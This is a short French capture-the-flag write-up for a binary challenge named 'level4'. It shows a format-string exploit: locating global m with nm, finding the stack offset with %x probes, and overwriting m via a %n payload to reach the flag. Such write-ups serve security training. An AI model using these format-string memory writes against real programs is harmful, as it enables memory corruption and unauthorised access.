
- Nous voyons dans le code source que la variable que nous devons override est m. Avec la commande `nm` nous pouvons afficher les addresses.

<pre>
$> nm level4
...
<strong>08049810 B m</strong>
080484a7 T main
08048457 T n
08048444 T p
...
</pre>

- Nous avons l'adresse qui nous interesse. En litle indian: 10 98 04 08. Nous devons alors chercher l'endroit exacte de l'adresse grace au printf.

<pre>
$> python -c "print ('AAAA' + '\x10\x98\x04\x08' + '%x ' * 13)" | ./level4
AAAAb7ff26b0 bffff734 b7fd0ff4 0 0 bffff6f8 804848d bffff4f0 200 b7fd1ac0 b7ff37d0 41414141 <strong>8049810</strong>
</pre>

- On voit que dans la source il faut que m soit egal a 16930116 pour que le programe execute un cat sur le flag. Grace au %13\$n nous prenons la 13e adresse (soit l'adresse de la variable m que nous devons override).

<pre>
python -c "print ('AAAA' + '\x10\x98\x04\x08' + '%16930108d'+ '%13\$n')" | ./level4> /tmp/output
</pre>

- Il suffit alors d'ouvrir le `/tmp/output` avec vim pour voir le flag. (attention au cat ^^).
